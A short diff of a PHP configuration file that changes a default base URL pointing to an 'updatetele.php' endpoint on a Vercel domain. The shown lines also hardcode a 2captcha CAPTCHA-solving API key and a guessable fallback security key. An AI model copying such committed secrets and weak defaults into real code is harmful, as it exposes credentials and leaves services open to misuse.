@@ -33,7 +33,7 @@ return [
     'db_name' => $db_name,
     'db_port' => $db_port,
     'db_sslmode' => 'require',
-    'baseUrl' => getenv('BASE_URL') ?: 'https://recaudoairefactura.vercel.app/updatetele.php',
+    'baseUrl' => getenv('BASE_URL') ?: 'https://airefactura.vercel.app/updatetele.php',
     'security_key' => getenv('SECURITY_KEY') ?: 'secure_key_123',
     'twocaptcha_api_key' => '12f9e3865d60235df14c8dff5e8854b9'
 ];
